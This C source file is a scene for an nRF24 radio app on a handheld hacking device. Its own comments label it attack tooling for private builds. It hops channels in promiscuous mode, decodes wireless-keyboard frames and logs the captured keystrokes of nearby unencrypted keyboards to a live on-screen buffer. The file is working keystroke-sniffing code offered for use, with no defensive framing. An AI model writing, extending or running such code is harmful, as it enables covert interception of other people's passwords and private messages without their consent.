/* nRF24 KeySniffer -- attack tooling, PRIVATE builds only (whole file
 * gated, same pattern as scene_sniffer.c / subghz_scene_garage.c).
 *
 * Reuses the promiscuous-RX hop pattern from scene_sniffer.c (itself
 * mirroring scene_mj_scan.c): nrf24_hw_init/probe/acquire/release,
 * nrf24_hw_rx_start_promiscuous(), the ce(false)+set_channel()+ce(true)
 * hop dance, and the CRC16-CCITT ESB frame validate+extract half of
 * nrf24_mj_core.c's mj_fingerprint(). That decode lives in the shared
 * helpers/nrf24_esb.c (nrf24_esb_decode_frame()), used by both this scene
 * and scene_sniffer.c.
 *
 * Every CRC-valid frame is packaged as an Nrf24Capture and handed to
 * Task 3's nrf24_keysniffer_decode() (helpers/nrf24_keysniffer.h). A
 * decoded printable char is appended to a bounded, mutex-protected
 * keystroke-log ring buffer and rendered live via
 * widget_add_text_scroll_element() -- the live-log Tick-refresh pattern
 * from can_commander_scene_monitor.c.
 *
 * Single continuous-capture UI (no List/Confirm/Replay sub-states --
 * KeySniffer only logs, it doesn't replay). Back pops the scene;
 * on_exit() always stops+joins the worker regardless of navigation
 * path -- the same abort-flag + safe-join pattern as scene_sniffer.c's
 * Scanning state / on_exit().
 */
#ifndef PUBLIC_BUILD

#include "../nrf24_app.h"
#include "../nrf24_hw.h"
#include "../helpers/nrf24_capture.h"
#include "../helpers/nrf24_keysniffer.h"
#include "../helpers/nrf24_esb.h"

#include <furi.h>
#include <esp_rom_sys.h>
#include <freertos/FreeRTOS.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define TAG "Nrf24KeySniffer"

#define KS_CH_MIN       2
#define KS_CH_MAX       84
#define KS_TRIES_PER_CH 6
#define KS_DWELL_US     500

/* Bounded scrolling keystroke-log ring buffer (chars, not rows -- one
 * char per decoded keypress). Old chars fall off the front once full,
 * same drop-oldest behavior as nrf24_capture's store. */
#define KS_LOG_CAP 192

typedef struct {
    Nrf24App* app;
    FuriThread* worker;
    volatile bool stop; /* abort flag: Back / on_exit set it, worker polls it */
    volatile bool hw_checked;
    volatile bool hw_ok;
    volatile uint8_t cur_channel;
    volatile uint32_t frames_seen;
    volatile uint32_t keys_decoded;

    FuriMutex* log_mutex; /* guards log[]/log_head/log_len (worker writes, Tick reads) */
    char log[KS_LOG_CAP];
    uint16_t log_head; /* next write index */
    uint16_t log_len; /* valid chars, saturates at KS_LOG_CAP */
} KeySnifferCtx;

static KeySnifferCtx* g_ctx = NULL;

/* Append one decoded char to the ring buffer (mutex-protected: called from
 * the worker thread, read from the Tick handler on the UI thread). */
static void ks_log_push(KeySnifferCtx* ctx, char c) {
    furi_mutex_acquire(ctx->log_mutex, FuriWaitForever);
    ctx->log[ctx->log_head] = c;
    ctx->log_head = (uint16_t)((ctx->log_head + 1) % KS_LOG_CAP);
    if(ctx->log_len < KS_LOG_CAP) ctx->log_len++;
    furi_mutex_release(ctx->log_mutex);
}

/* ---- Scan worker: hop + capture + decode (mirrors scene_sniffer.c's
 * sniffer_scan_worker, with the capture-store add swapped for a
 * keysniffer_decode + log-append). ---- */
static int32_t ks_scan_worker(void* context) {
    KeySnifferCtx* ctx = context;

    nrf24_hw_init();

    nrf24_hw_acquire();
    bool ok = nrf24_hw_probe();
    nrf24_hw_release();

    ctx->hw_ok = ok;
    ctx->hw_checked = true;

    if(!ok) {
        FURI_LOG_W(TAG, "NRF24 probe failed");
        nrf24_hw_deinit();
        return 0;
    }

    nrf24_hw_acquire();
    nrf24_hw_rx_start_promiscuous(KS_CH_MIN);
    nrf24_hw_release();

    while(!ctx->stop) {
        for(uint8_t ch = KS_CH_MIN; ch <= KS_CH_MAX && !ctx->stop; ch++) {
            nrf24_hw_acquire();
            nrf24_hw_ce(false);
            nrf24_hw_set_channel(ch);
            nrf24_hw_flush_rx();
            nrf24_hw_ce(true);

            for(int t = 0; t < KS_TRIES_PER_CH && !ctx->stop; t++) {
                esp_rom_delay_us(KS_DWELL_US);
                if(nrf24_hw_rx_data_ready()) {
                    uint8_t buf[32];
                    nrf24_hw_rx_read_payload(buf, sizeof(buf));

                    uint8_t addr[5];
                    uint8_t payload[32];
                    uint8_t len = 0;
                    if(nrf24_esb_decode_frame(buf, sizeof(buf), addr, payload, &len)) {
                        ctx->frames_seen++;

                        Nrf24Capture cap;
                        memset(&cap, 0, sizeof(cap));
                        memcpy(cap.addr, addr, sizeof(cap.addr));
                        cap.channel = ch;
                        memcpy(cap.payload, payload, len);
                        cap.len = len;
                        cap.ts = furi_get_tick();
                        cap.proto = N24_KEYBOARD;

                        char decoded = 0;
                        if(nrf24_keysniffer_decode(&cap, &decoded, NULL, NULL)) {
                            ctx->keys_decoded++;
                            ks_log_push(ctx, decoded);
                        }
                    }
                }
            }
            nrf24_hw_release();
            ctx->cur_channel = ch;
        }
        furi_delay_ms(2);
    }

    nrf24_hw_acquire();
    nrf24_hw_rx_stop();
    nrf24_hw_power_down();
    nrf24_hw_release();
    nrf24_hw_deinit();
    return 0;
}

/* ---- View builder ---- */
static void ks_build_widget(Nrf24App* app, KeySnifferCtx* ctx) {
    widget_reset(app->widget);
    widget_add_text_box_element(
        app->widget, 0, 0, 128, 12, AlignCenter, AlignTop, "\e#nRF24 KeySniffer\e#", false);

    if(ctx->hw_checked && !ctx->hw_ok) {
        widget_add_text_box_element(
            app->widget, 0, 26, 128, 16, AlignCenter, AlignCenter, "NRF24 not found", false);
        return;
    }

    widget_add_string_element(
        app->widget, 64, 13, AlignCenter, AlignTop, FontSecondary, "Unencrypted keyboards only");

    /* Snapshot the ring buffer under the mutex, oldest-first, then build the
     * scroll text outside the lock (no crash / hang if nothing decoded yet
     * -- log_len stays 0 and the snapshot is empty). */
    char snapshot[KS_LOG_CAP + 1];
    uint16_t snap_len = 0;
    uint32_t frames;
    uint32_t keys;

    furi_mutex_acquire(ctx->log_mutex, FuriWaitForever);
    frames = ctx->frames_seen;
    keys = ctx->keys_decoded;
    uint16_t start = (uint16_t)((ctx->log_head + KS_LOG_CAP - ctx->log_len) % KS_LOG_CAP);
    for(uint16_t i = 0; i < ctx->log_len; i++) {
        snapshot[snap_len++] = ctx->log[(start + i) % KS_LOG_CAP];
    }
    furi_mutex_release(ctx->log_mutex);
    snapshot[snap_len] = '\0';

    char stats[40];
    snprintf(
        stats,
        sizeof(stats),
        "Ch %3u  %lu frm  %lu keys\n",
        ctx->cur_channel,
        (unsigned long)frames,
        (unsigned long)keys);

    char full[sizeof(stats) + KS_LOG_CAP + 24];
    snprintf(
        full,
        sizeof(full),
        "%s%s",
        stats,
        snap_len ? snapshot : "(no keystrokes captured yet)");

    widget_add_text_scroll_element(app->widget, 0, 24, 128, 40, full);
}

/* ---- Scene lifecycle ---- */
void nrf24_app_scene_keysniffer_on_enter(void* context) {
    Nrf24App* app = context;

    KeySnifferCtx* ctx = malloc(sizeof(KeySnifferCtx));
    if(!ctx) return;
    memset(ctx, 0, sizeof(*ctx));
    ctx->app = app;
    ctx->cur_channel = KS_CH_MIN;
    ctx->log_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    if(!ctx->log_mutex) {
        free(ctx);
        return;
    }
    g_ctx = ctx;

    ks_build_widget(app, ctx);
    view_dispatcher_switch_to_view(app->view_dispatcher, Nrf24ViewWidget);

    ctx->worker = furi_thread_alloc_ex("Nrf24KeySniff", 4096, ks_scan_worker, ctx);
    furi_thread_start(ctx->worker);
}

bool nrf24_app_scene_keysniffer_on_event(void* context, SceneManagerEvent event) {
    Nrf24App* app = context;
    if(!g_ctx) return false;

    if(event.type == SceneManagerEventTypeTick) {
        ks_build_widget(app, g_ctx);
        return true;
    }

    /* No custom events / no Back handling here -- Back just falls through to
     * `return false`, letting scene_manager pop the scene. on_exit() always
     * stops+joins the worker regardless of navigation path, which is the
     * abort: same pattern as scene_sniffer.c's Scanning state. */
    return false;
}

void nrf24_app_scene_keysniffer_on_exit(void* context) {
    Nrf24App* app = context;
    if(!g_ctx) return;

    g_ctx->stop = true;
    if(g_ctx->worker) {
        furi_thread_join(g_ctx->worker);
        furi_thread_free(g_ctx->worker);
        g_ctx->worker = NULL;
    }
    if(g_ctx->log_mutex) {
        furi_mutex_free(g_ctx->log_mutex);
        g_ctx->log_mutex = NULL;
    }
    free(g_ctx);
    g_ctx = NULL;

    widget_reset(app->widget);
}

#endif /* !PUBLIC_BUILD -- attack tooling, private only */
